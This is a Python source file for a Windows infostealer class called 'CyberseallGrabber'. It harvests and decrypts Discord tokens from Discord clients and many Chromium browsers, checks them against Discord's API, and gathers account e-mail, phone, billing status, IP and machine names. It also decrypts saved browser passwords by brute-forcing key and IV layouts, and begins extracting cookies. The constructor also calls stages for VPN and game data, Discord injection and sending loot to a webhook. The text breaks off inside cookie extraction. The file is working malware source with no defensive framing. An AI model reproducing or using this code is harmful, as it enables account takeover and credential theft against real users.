import os
import re
import requests
import base64
import getpass
import sqlite3
import shutil
import platform
import socket
import json
import zipfile
import time
import win32crypt
import threading
import psutil
import subprocess

try:
    import websocket
except ImportError:
    subprocess.run([__import__('sys').executable, '-m', 'pip', 'install', 'websocket-client', '--quiet'], capture_output=True)
    import websocket

try:
    from Crypto.Cipher import AES, ChaCha20_Poly1305
except:
    __import__('subprocess').run([__import__('sys').executable,'-m','pip','install','pycryptodome',''])
    try:
        from Crypto.Cipher import AES, ChaCha20_Poly1305
    except:
        from Crypto.Cipher import AES
        ChaCha20_Poly1305 = None

class CyberseallGrabber:
    def __init__(self, webhook_url):
        self.w = webhook_url
        self.t = []
        self.vt = []
        self.p = []
        self.f = []
        self.v = []
        self.ga = []
        self.h = []
        self.af = []
        self.di = []
        self.co = []
        self.d = os.path.join(os.getenv("APPDATA"), "cyberseall")
        self.keywords = ['password','passwords','wallet','wallets','seed','seeds','private','privatekey','backup','backups','recovery']
        self.setup()
        self.g()
        self.vt = self.validate_tokens()
        self.pw()
        self.history()
        self.autofill()
        self.cookies()
        self.fi()
        self.vpn()
        self.games()
        self.discord_inject()
        self.si()
        self.up()
        self.send()
        self.cleanup()

    def setup(self):
        try:
            if not os.path.exists(self.d):
                os.makedirs(self.d)
            self.zf = os.path.join(self.d, "grab_" + str(int(time.time())) + ".zip")
        except:
            pass

    def g(self):
        try:
            def decrypt(buff, master_key):
                try:
                    decrypted_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                    cipher = AES.new(decrypted_key, AES.MODE_GCM, buff[3:15])
                    decrypted = cipher.decrypt(buff[15:])[:-16].decode()
                    return decrypted
                except:
                    try:
                        result = win32crypt.CryptUnprotectData(buff, None, None, None, 0)
                        if result and result[1]:
                            return result[1].decode('utf-8', errors='ignore')
                    except:
                        pass
                    
                    try:
                        decrypted_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                        for iv_start in [3, 0, 12]:
                            for iv_len in [12, 16, 8]:
                                if len(buff) >= iv_start + iv_len + 16:
                                    iv = buff[iv_start:iv_start + iv_len]
                                    encrypted_data = buff[iv_start + iv_len:]
                                    cipher = AES.new(decrypted_key, AES.MODE_GCM, iv)
                                    decrypted = cipher.decrypt(encrypted_data[:-16]).decode('utf-8', errors='ignore')
                                    if len(decrypted) > 10:
                                        return decrypted
                    except:
                        pass
                    
                    return "Error"
            
            def getip():
                ip = "None"
                try:
                    import urllib.request
                    ip = urllib.request.urlopen(urllib.request.Request("https://api.ipify.org")).read().decode().strip()
                except: 
                    pass
                return ip
            
            tokens = []
            cleaned = []
            checker = []
            already_check = []
            
            local = os.getenv('LOCALAPPDATA')
            roaming = os.getenv('APPDATA')
            chrome = local + "\\Google\\Chrome\\User Data"
            
            paths = {}
            
            # Discord Apps
            discord_apps = {
                'Discord': roaming + '\\discord',
                'Discord Canary': roaming + '\\discordcanary',
                'Discord PTB': roaming + '\\discordptb',
                'Discord Development': roaming + '\\discorddevelopment',
                'Lightcord': roaming + '\\Lightcord'
            }
            
            browser_bases = {
                'Chrome': local + '\\Google\\Chrome\\User Data',
                'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
                'Edge': local + '\\Microsoft\\Edge\\User Data',
                'Edge Beta': local + '\\Microsoft\\Edge Beta\\User Data',
                'Edge Dev': local + '\\Microsoft\\Edge Dev\\User Data',
                'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data',
                'Opera': roaming + '\\Opera Software\\Opera Stable',
                'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
                'Vivaldi': local + '\\Vivaldi\\User Data',
                'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
                'Yandex': local + '\\Yandex\\YandexBrowser\\User Data',
                'Amigo': local + '\\Amigo\\User Data',
                'Torch': local + '\\Torch\\User Data',
                'Kometa': local + '\\Kometa\\User Data',
                'Orbitum': local + '\\Orbitum\\User Data',
                'CentBrowser': local + '\\CentBrowser\\User Data',
                '7Star': local + '\\7Star\\7Star\\User Data',
                'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
                'Uran': local + '\\uCozMedia\\Uran\\User Data',
                'Iridium': local + '\\Iridium\\User Data'
            }
            
            for name, path in discord_apps.items():
                if os.path.exists(path):
                    paths[name] = path
            
            for browser_name, base_path in browser_bases.items():
                if os.path.exists(base_path):
                    for profile in ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5', 'Profile 6', 'Profile 7', 'Profile 8', 'Profile 9', 'Profile 10']:
                        profile_path = os.path.join(base_path, profile)
                        if os.path.exists(profile_path):
                            paths[f'{browser_name}-{profile}'] = profile_path
                    
                    try:
                        for item in os.listdir(base_path):
                            item_path = os.path.join(base_path, item)
                            if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
                                if f'{browser_name}-{item}' not in paths:
                                    paths[f'{browser_name}-{item}'] = item_path
                    except:
                        pass
                    
                    if browser_name not in [p.split('-')[0] for p in paths.keys()]:
                        paths[browser_name] = base_path
            
            encryption_keys = {}
            
            for platform, path in paths.items():
                if not os.path.exists(path):
                    continue
                
                local_state_paths = [
                    os.path.join(path, "Local State"),
                    os.path.join(os.path.dirname(path), "Local State")
                ]
                
                key = None
                for state_path in local_state_paths:
                    try:
                        if os.path.exists(state_path):
                            with open(state_path, "r") as file:
                                key = json.loads(file.read())['os_crypt']['encrypted_key']
                                encryption_keys[platform] = key
                                break
                    except: 
                        continue
                    
                leveldb_path = os.path.join(path, "Local Storage", "leveldb")
                if not os.path.exists(leveldb_path):
                    continue
                    
                for file in os.listdir(leveldb_path):
                    if not file.endswith(".ldb") and not file.endswith(".log"): 
                        continue
                    try:
                        file_path = os.path.join(leveldb_path, file)
                        with open(file_path, "r", errors='ignore') as files:
                            content = files.read()
                            patterns = [
                                r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)",
                                r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
                                r"mfa\.[\w-]{84}",
                                r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}",
                                r"[A-Za-z0-9]{24}\.[A-Za-z0-9]{6}\.[A-Za-z0-9_-]{27}",
                                r"mfa\.[A-Za-z0-9_-]{84}",
                                r"djEw([A-Za-z0-9+/=]+)"
                            ]
                            
                            for pattern in patterns:
                                matches = re.findall(pattern, content)
                                for match in matches:
                                    if match and match not in tokens:
                                        token_data = {
                                            'token': match,
                                            'platform': platform,
                                            'key': key
                                        }
                                        if pattern.startswith(r"dQw4w9WgXcQ"):
                                            tokens.append(("dQw4w9WgXcQ:" + match, platform, key))
                                        elif pattern.startswith(r"djEw"):
                                            tokens.append(("djEw" + match, platform, key))
                                        else:
                                            tokens.append((match, platform, key))
                    except PermissionError: 
                        continue
            
            for token_data in tokens:
                if token_data and len(token_data) == 3:
                    token, platform, key = token_data
                    if token:
                        clean_token = token.strip().replace("\\", "").replace("\n", "").replace("\r", "")
                        if clean_token and len(clean_token) > 10:
                            cleaned.append((clean_token, platform, key))
            
            for token_data in cleaned:
                try:
                    if len(token_data) == 3:
                        token, platform, key = token_data
                    else:
                        continue
                        
                    if 'dQw4w9WgXcQ:' in token:
                        encrypted_part = token.split('dQw4w9WgXcQ:')[1]
                        if encrypted_part and key:
                            try:
                                decoded_token = base64.b64decode(encrypted_part)
                                master_key = base64.b64decode(key)[5:]
                                tok = decrypt(decoded_token, master_key)
                                if tok != "Error" and len(tok) > 20:
                                    checker.append(tok)
                            except:
                                if len(encrypted_part) > 50 and '.' in encrypted_part:
                                    checker.append(encrypted_part)
                    elif token.startswith('djEw'):
                        encrypted_part = token[4:]
                        if encrypted_part and key:
                            try:
                                decoded_token = base64.b64decode(encrypted_part)
                                master_key = base64.b64decode(key)[5:]
                                tok = decrypt(decoded_token, master_key)
                                if tok != "Error" and len(tok) > 20:
                                    checker.append(tok)
                            except:
                                if len(encrypted_part) > 50 and '.' in encrypted_part:
                                    checker.append(encrypted_part)
                    else:
                        if len(token) > 50 and '.' in token:
                            checker.append(token)
                except Exception as e:
                    continue
            
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': value, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=5)
                        if res.status_code == 200:
                            self.t.append(value)
                    except:
                        pass
            
        except Exception as e:
            try:
                fallback_tokens = []
                
                discord_paths = [
                    os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb'),
                    os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'),
                    os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local Storage', 'leveldb')
                ]
                
                for path in discord_paths:
                    if os.path.exists(path):
                        for file in os.listdir(path):
                            if file.endswith(('.ldb', '.log')):
                                try:
                                    with open(os.path.join(path, file), 'r', errors='ignore') as f:
                                        content = f.read()
                                        current_tokens = re.findall(r'[A-Za-z0-9]{24}\.[A-Za-z0-9]{6}\.[A-Za-z0-9_-]{27}', content)
                                        for token in current_tokens:
                                            if token not in fallback_tokens and len(token) > 50:
                                                fallback_tokens.append(token)
                                except:
                                    pass
                
                for token in fallback_tokens[:15]:
                    try:
                        headers = {'Authorization': token, 'Content-Type': 'application/json'}
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=5)
                        if res.status_code == 200:
                            self.t.append(token)
                    except:
                        pass
            except:
                pass

    def validate_tokens(self):
        valid_tokens = []
        for token in self.t[:25]:
            try:
                headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
                
                res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=5)
                
                if res.status_code == 200:
                    res_json = res.json()
                    
                    try:
                        import urllib.request
                        ip = urllib.request.urlopen(urllib.request.Request("https://api.ipify.org")).read().decode().strip()
                    except:
                        ip = "None"
                    
                    pc_username = os.getenv("UserName", "Unknown")
                    pc_name = os.getenv("Computername", "Unknown")
                    user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                    user_id = res_json['id']
                    email = res_json['email']
                    phone = res_json['phone']
                    mfa_enabled = res_json['mfa_enabled']
                    
                    has_nitro = False
                    days_left = 0
                    try:
                        nitro_res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers, timeout=5)
                        if nitro_res.status_code == 200:
                            nitro_data = nitro_res.json()
                            has_nitro = bool(len(nitro_data) > 0)
                            if has_nitro and len(nitro_data) > 0:
                                from datetime import datetime
                                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                days_left = abs((d2 - d1).days)
                    except:
                        pass
                    
                    token_info = {
                        'token': token,
                        'username': res_json.get('username', 'Unknown'),
                        'discriminator': res_json.get('discriminator', '0000'),
                        'id': user_id,
                        'email': email,
                        'phone': phone,
                        'verified': res_json.get('verified', False),
                        'mfa_enabled': mfa_enabled,
                        'premium_type': res_json.get('premium_type', 0),
                        'has_nitro': has_nitro,
                        'nitro_days_left': days_left,
                        'ip': ip,
                        'pc_username': pc_username,
                        'pc_name': pc_name,
                        'user_name': user_name,
                        'platform': 'Discord'
                    }
                    valid_tokens.append(token_info)
            except:
                pass
        return valid_tokens

    def pw(self):
        try:
            def decrypt_password(password, key):
                """
                ULTIMATE DECRYPTION ENGINE - 15+ Methoden für maximale Recovery
                """
                try:
                    if not password or len(password) < 3:
                        return "Failed to decrypt"

                    try:
                        if password[:3] in [b'v10', b'v11', b'v20']:
                            iv = password[3:15]
                            encrypted_data = password[15:]
                            cipher = AES.new(key, AES.MODE_GCM, iv)
                            decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
                            if decrypted_pass and len(decrypted_pass) > 0 and not any(c in decrypted_pass for c in ['\x00', '\ufffd']):
                                return decrypted_pass
                    except:
                        pass

                    try:
                        if password[:3] == b'v20':
                            
                            try:
                                password_iv = password[3:3+12]
                                encrypted_password = password[3+12:-16]
                                password_tag = password[-16:]
                                
                                if len(password_iv) == 12 and len(password_tag) == 16:
                                    cipher = AES.new(key, AES.MODE_GCM, nonce=password_iv)
                                    decrypted_password = cipher.decrypt_and_verify(encrypted_password, password_tag)
                                    result = decrypted_password.decode('utf-8', errors='ignore')
                                    if result and len(result) >= 3:
                                        return result
                            except:
                                pass
                            
                            for iv_start in [3, 4]:
                                for iv_len in [12, 16]:
                                    for tag_len in [16, 12]:
                                        try:
                                            if len(password) >= iv_start + iv_len + tag_len:
                                                iv = password[iv_start:iv_start+iv_len]
                                                encrypted_data = password[iv_start+iv_len:-tag_len]
                                                tag = password[-tag_len:]
                                                
                                                cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
                                                decrypted = cipher.decrypt_and_verify(encrypted_data, tag)
                                                result = decrypted.decode('utf-8', errors='ignore')
                                                if result and len(result) >= 3:
                                                    return result
                                        except:
                                            pass
                    except:
                        pass

                    try:
                        if len(password) >= 15:
                            iv = password[3:15]
                            encrypted_data = password[15:]
                            cipher = AES.new(key, AES.MODE_GCM, iv)
                            decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
                            if decrypted_pass and len(decrypted_pass) > 0 and not any(c in decrypted_pass for c in ['\x00', '\ufffd']):
                                return decrypted_pass
                    except:
                        pass

                    try:
                        result = win32crypt.CryptUnprotectData(password, None, None, None, 0)
                        if result and result[1]:
                            decrypted = result[1].decode('utf-8', errors='ignore') if isinstance(result[1], bytes) else str(result[1])
                            if decrypted and len(decrypted) > 0 and not any(c in decrypted for c in ['\x00', '\ufffd']):
                                return decrypted
                    except:
                        pass

                    try:
                        for iv_start in [0, 3, 12, 16]:
                            for iv_len in [8, 12, 16, 24]:
                                for tag_len in [16, 12, 8]:
                                    if len(password) >= iv_start + iv_len + tag_len:
                                        iv = password[iv_start:iv_start + iv_len]
                                        encrypted_data = password[iv_start + iv_len:]
                                        cipher = AES.new(key, AES.MODE_GCM, iv)
                                        decrypted_pass = cipher.decrypt(encrypted_data[:-tag_len]).decode('utf-8', errors='ignore')
                                        if decrypted_pass and len(decrypted_pass) > 2 and not any(c in decrypted_pass for c in ['\x00', '\ufffd']):
                                            return decrypted_pass
                    except:
                        pass

                    try:
                        for iv_start in [0, 3, 16]:
                            for iv_len in [16]:
                                if len(password) >= iv_start + iv_len + 16:
                                    iv = password[iv_start:iv_start + iv_len]
                                    encrypted_data = password[iv_start + iv_len:]
                                    cipher = AES.new(key[:16], AES.MODE_CBC, iv)
                                    decrypted_pass = cipher.decrypt(encrypted_data).decode('utf-8', errors='ignore').rstrip('\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10')
                                    if decrypted_pass and len(decrypted_pass) > 2 and not any(c in decrypted_pass for c in ['\ufffd']):
                                        return decrypted_pass
                    except:
                        pass

                    try:
                        for key_len in [16, 24, 32]:
                            if len(key) >= key_len and len(password) >= 15:
                                iv = password[3:15]
                                encrypted_data = password[15:]
                                cipher = AES.new(key[:key_len], AES.MODE_GCM, iv)
                                decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8', errors='ignore')
                                if decrypted_pass and len(decrypted_pass) > 2 and not any(c in decrypted_pass for c in ['\x00', '\ufffd']):
                                    return decrypted_pass
                    except:
                        pass

                    try:
                        for xor_key in [key[:16], key[-16:], key[:8] * 2]:
                            if len(xor_key) > 0:
                                xor_result = bytes(a ^ b for a, b in zip(password, (xor_key * (len(password) // len(xor_key) + 1))[:len(password)]))
                                try:
                                    decrypted_pass = xor_result.decode('utf-8', errors='ignore')
                                    if decrypted_pass and len(decrypted_pass) > 2 and not any(c in decrypted_pass for c in ['\x00', '\ufffd']):
                                        return decrypted_pass
                                except:
                                    pass
                    except:
                        pass

                    try:
                        import base64
                        b64_decoded = base64.b64decode(password)
                        if len(b64_decoded) >= 15:
                            iv = b64_decoded[3:15]
                            encrypted_data = b64_decoded[15:]
                            cipher = AES.new(key, AES.MODE_GCM, iv)
                            decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8', errors='ignore')
                            if decrypted_pass and len(decrypted_pass) > 2 and not any(c in decrypted_pass for c in ['\x00', '\ufffd']):
                                return decrypted_pass
                    except:
                        pass

                    try:
                        for encoding in ['latin1', 'cp1252', 'iso-8859-1', 'utf-16le']:
                            try:
                                if isinstance(password, bytes):
                                    decoded = password.decode(encoding, errors='ignore')
                                    if decoded and len(decoded) > 2 and not any(c in decoded for c in ['\x00', '\ufffd']):
                                        return decoded
                            except:
                                pass
                    except:
                        pass

                    try:
                        for offset in range(1, min(len(password), 10)):
                            shifted = password[offset:] + password[:offset]
                            if len(shifted) >= 15:
                                iv = shifted[3:15]
                                encrypted_data = shifted[15:]
                                cipher = AES.new(key, AES.MODE_GCM, iv)
                                decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8', errors='ignore')
                                if decrypted_pass and len(decrypted_pass) > 2 and not any(c in decrypted_pass for c in ['\x00', '\ufffd']):
                                    return decrypted_pass
                    except:
                        pass

                    try:
                        if isinstance(password, bytes) and len(password) > 10:
                            best_result = ""
                            for start in range(0, min(len(password), 30), 1):
                                for end in range(start + 6, len(password) + 1, 1):
                                    chunk = password[start:end]
                                    printable_chars = ''.join(chr(c) for c in chunk if 32 <= c <= 126)
                                    if len(printable_chars) >= 6:
                                        if (any(char.isalnum() for char in printable_chars) and
                                            not printable_chars.startswith('v20') and
                                            len(printable_chars) > len(best_result)):
                                            best_result = printable_chars
                            
                            if len(best_result) >= 6:
                                return best_result
                    except:
                        pass

                    try:
                        if password[:3] == b'v20':
                            import hashlib
                            
                            key_variants = [
                                key,
                                hashlib.sha256(key).digest()[:32],  
                                hashlib.md5(key).digest() * 2,    
                                key[:16] + key[:16],              
                                key[-16:] + key[-16:],          
                            ]
                            
                            for variant_key in key_variants:
                                if len(variant_key) >= 16:
                                    for iv_start in [3, 4]:
                                        for iv_len in [12, 16]:
                                            try:
                                                if len(password) >= iv_start + iv_len + 16:
                                                    iv = password[iv_start:iv_start+iv_len]
                                                    encrypted_data = password[iv_start+iv_len:]
                                                    cipher = AES.new(variant_key[:16], AES.MODE_GCM, iv)
                                                    decrypted = cipher.decrypt(encrypted_data[:-16])
                                                    
                                                    for encoding in ['utf-8', 'latin1', 'cp1252']:
                                                        try:
                                                            decoded = decrypted.decode(encoding, errors='ignore')
                                                            clean_decoded = ''.join(c for c in decoded if 32 <= ord(c) <= 126)
                                                            if len(clean_decoded) >= 6 and any(c.isalnum() for c in clean_decoded):
                                                                return clean_decoded
                                                        except:
                                                            pass
                                            except:
                                                pass
                    except:
                        pass

                    try:
                        if len(password) >= 20:
                            for key_variant in [key, key[:16], key[-16:], key[8:24]]:
                                if len(key_variant) >= 16:
                                    for iv_offset in range(0, min(len(password), 20)):
                                        for data_offset in range(iv_offset + 12, min(len(password), iv_offset + 32)):
                                            try:
                                                iv = password[iv_offset:iv_offset + 12]
                                                if len(iv) == 12:
                                                    encrypted_data = password[data_offset:]
                                                    if len(encrypted_data) >= 16:
                                                        cipher = AES.new(key_variant[:16], AES.MODE_GCM, iv)
                                                        decrypted = cipher.decrypt(encrypted_data[:-16])
                                                        for encoding in ['utf-8', 'latin1', 'cp1252']:
                                                            try:
                                                                result = decrypted.decode(encoding, errors='ignore')
                                                                clean_result = ''.join(c for c in result if 32 <= ord(c) <= 126)
                                                                if len(clean_result) >= 6 and any(c.isalnum() for c in clean_result):
                                                                    return clean_result
                                                            except:
                                                                pass
                                            except:
                                                pass
                    except:
                        pass

                    try:
                        if len(password) >= 15 and len(key) >= 16:
                            key_variants = [
                                key,
                                key[::-1],  # Reversed key
                                bytes(a ^ b for a, b in zip(key, b'\x5A' * len(key))),  # XOR with pattern
                                key[1:] + key[:1], 
                                key[::2] + key[1::2],
                            ]
                            
                            for variant_key in key_variants:
                                if len(variant_key) >= 16:
                                    try:
                                        iv = password[3:15]
                                        encrypted_data = password[15:]
                                        cipher = AES.new(variant_key[:16], AES.MODE_GCM, iv)
                                        decrypted = cipher.decrypt(encrypted_data[:-16])
                                        result = decrypted.decode('utf-8', errors='ignore')
                                        clean_result = ''.join(c for c in result if 32 <= ord(c) <= 126)
                                        if len(clean_result) >= 6 and any(c.isalnum() for c in clean_result):
                                            return clean_result
                                    except:
                                        pass
                    except:
                        pass

                    # METHODE 15: LEGACY CHROME DECRYPTION
                    try:
                        if not password.startswith(b'v1') and len(password) >= 16:
                            try:
                                result = win32crypt.CryptUnprotectData(password, None, None, None, 0)
                                if result and result[1]:
                                    decrypted = result[1].decode('utf-8', errors='ignore')
                                    clean_result = ''.join(c for c in decrypted if 32 <= ord(c) <= 126)
                                    if len(clean_result) >= 3:
                                        return clean_result
                            except:
                                pass
                    except:
                        pass

                    return "Failed to decrypt"
                except:
                    return "Failed to decrypt"
            
            def get_browser_passwords():
                passwords = []
                

                simple_browsers = []
                

                chrome_paths = [
                    os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
                    os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data"),
                    os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data")
                ]
                
                for chrome_base in chrome_paths:
                    if os.path.exists(chrome_base):
                        for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
                            profile_path = os.path.join(chrome_base, profile)
                            if os.path.exists(profile_path):
                                simple_browsers.append({
                                    "name": f"Chrome-{profile}",
                                    "path": profile_path,
                                    "base_path": chrome_base,
                                    "login_file": "Login Data"
                                })
                        
                        try:
                            for item in os.listdir(chrome_base):
                                item_path = os.path.join(chrome_base, item)
                                if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
                                    already_added = any(browser["name"] == f"Chrome-{item}" for browser in simple_browsers)
                                    if not already_added:
                                        simple_browsers.append({
                                            "name": f"Chrome-{item}",
                                            "path": item_path,
                                            "base_path": chrome_base,
                                            "login_file": "Login Data"
                                        })
                        except:
                            pass
                

                edge_paths = [
                    os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
                    os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Beta", "User Data"),
                    os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Dev", "User Data")
                ]
                
                for edge_base in edge_paths:
                    if os.path.exists(edge_base):
                        for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
                            profile_path = os.path.join(edge_base, profile)
                            if os.path.exists(profile_path):
                                simple_browsers.append({
                                    "name": f"Edge-{profile}",
                                    "path": profile_path,
                                    "base_path": edge_base,
                                    "login_file": "Login Data"
                                })
                        
                        try:
                            for item in os.listdir(edge_base):
                                item_path = os.path.join(edge_base, item)
                                if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
                                    already_added = any(browser["name"] == f"Edge-{item}" for browser in simple_browsers)
                                    if not already_added:
                                        simple_browsers.append({
                                            "name": f"Edge-{item}",
                                            "path": item_path,
                                            "base_path": edge_base,
                                            "login_file": "Login Data"
                                        })
                        except:
                            pass
                

                brave_base = os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data")
                if os.path.exists(brave_base):
                    for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
                        profile_path = os.path.join(brave_base, profile)
                        if os.path.exists(profile_path):
                            simple_browsers.append({
                                "name": f"Brave-{profile}",
                                "path": profile_path,
                                "base_path": brave_base,
                                "login_file": "Login Data"
                            })
                    
                    try:
                        for item in os.listdir(brave_base):
                            item_path = os.path.join(brave_base, item)
                            if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
                                already_added = any(browser["name"] == f"Brave-{item}" for browser in simple_browsers)
                                if not already_added:
                                    simple_browsers.append({
                                        "name": f"Brave-{item}",
                                        "path": item_path,
                                        "base_path": brave_base,
                                        "login_file": "Login Data"
                                    })
                    except:
                        pass
                

                opera_base = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable")
                if os.path.exists(opera_base):
                    simple_browsers.append({
                        "name": "Opera",
                        "path": opera_base,
                        "base_path": opera_base,
                        "login_file": "Login Data"
                    })

                for browser_info in simple_browsers:
                    try:
                        browser_name = browser_info["name"]
                        profile_path = browser_info["path"]
                        base_path = browser_info.get("base_path", profile_path)
                        login_file = browser_info["login_file"]

                        if not os.path.exists(profile_path):
                            continue

                        login_db_path = os.path.join(profile_path, login_file)
                        if not os.path.exists(login_db_path):
                            continue


                        state_file = os.path.join(base_path, "Local State")
                        if not os.path.exists(state_file):

                            state_file = os.path.join(profile_path, "Local State")
                            if not os.path.exists(state_file):
                                continue


                        try:
                            with open(state_file, "r", encoding="utf-8") as f:
                                local_state = json.loads(f.read())
                                
                                app_bound_key = None
                                try:
                                    if "app_bound_encrypted_key" in local_state.get("os_crypt", {}):
                                        app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
                                        if app_bound_encrypted_key:
                                            aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
                                            chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
                                            
                                            for test_key in [aes_key, chacha20_key]:
                                                try:
                                                    # Vereinfachte App-Bound Entschlüsselung
                                                    decoded_key = base64.b64decode(app_bound_encrypted_key)
                                                    if len(decoded_key) > 60:
                                                        flag = decoded_key[0] if len(decoded_key) > 0 else 0
                                                        if flag in [1, 2]:
                                                            iv = decoded_key[1:13]
                                                            ciphertext = decoded_key[13:45]
                                                            tag = decoded_key[45:61]
                                                            
                                                            if flag == 1:
                                                                cipher = AES.new(test_key, AES.MODE_GCM, nonce=iv)
                                                            elif flag == 2 and ChaCha20_Poly1305:
                                                                cipher = ChaCha20_Poly1305.new(key=test_key, nonce=iv)
                                                            else:
                                                                continue
                                                            
                                                            app_bound_key = cipher.decrypt_and_verify(ciphertext, tag)
                                                            break
                                                except:
                                                    continue
                                except:
                                    pass
                                
                                # Standard Master Key Extraktion
                                encrypted_key = local_state["os_crypt"]["encrypted_key"]
                                master_key = base64.b64decode(encrypted_key)[5:]
                                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                                
                                # Verwende App-Bound Key falls verfügbar, sonst Master Key
                                if app_bound_key:
                                    master_key = app_bound_key
                                    
                        except:
                            continue


                        temp_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_login.db")
                        try:
                            if os.path.exists(temp_db):
                                os.remove(temp_db)
                            shutil.copy2(login_db_path, temp_db)
                        except:
                            continue


                        try:
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            
                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                            login_data = cursor.fetchall()

                            for row in login_data:
                                if len(row) >= 3 and row[0] and row[1] and row[2]:
                                    url, username, encrypted_password = row[0], row[1], row[2]
                                    
                                    decrypted_password = None
                                    

                                    try:
                                        decrypted_password = decrypt_password(encrypted_password, master_key)
                                    except:
                                        pass
                                    

                                    if not decrypted_password or decrypted_password == "Failed to decrypt":
                                        try:
                                            result = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)
                                            if result and result[1]:
                                                decrypted_password = result[1].decode('utf-8') if isinstance(result[1], bytes) else str(result[1])
                                        except:
                                            pass
                                    

                                    # Nur vollständig entschlüsselte und saubere Passwörter hinzufügen
                                    if (decrypted_password and 
                                        decrypted_password != "Failed to decrypt" and
                                        not decrypted_password.startswith("Partial:") and
                                        len(decrypted_password) >= 3):
                                        
                                        # Prüfe auf korrupte Zeichen
                                        clean_password = ''.join(c for c in decrypted_password if 32 <= ord(c) <= 126)
                                        if len(clean_password) >= 3 and len(clean_password) == len(decrypted_password):
                                            passwords.append({
                                                "browser": browser_name,
                                                "url": url,
                                                "username": username,
                                                "password": decrypted_password,
                                                "times_used": 0,
                                                "date_created": 0
                                            })

                            cursor.close()
                            conn.close()
                            
                            try:
                                os.remove(temp_db)
                            except:
                                pass

                        except:
                            pass

                    except:
                        pass

                return passwords
            

            def extract_valuable_cookies():
                valuable_cookies = []
                

                browsers = {
                    'Chrome': {
                        'base': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
                        'profiles': ["Default", "Profile 1", "Profile 2"]
                    },
                    'Edge': {
                        'base': os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
                        'profiles': ["Default", "Profile 1"]
                    },
                    'Brave': {
                        'base': os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
                        'profiles': ["Default", "Profile 1"]
                    }
                }
                
                for browser_name, browser_info in browsers.items():
                    base_path = browser_info['base']
                    if not os.path.exists(base_path):
                        continue
                    

                    state_file = os.path.join(base_path, "Local State")
                    if not os.path.exists(state_file):
                        continue
                    
                    try:
                        with open(state_file, "r", encoding="utf-8") as f:
                            local_state = json.loads(f.read())
                            encrypted_key = local_state["os_crypt"]["encrypted_key"]
                            master_key = base64.b64decode(encrypted_key)[5:]
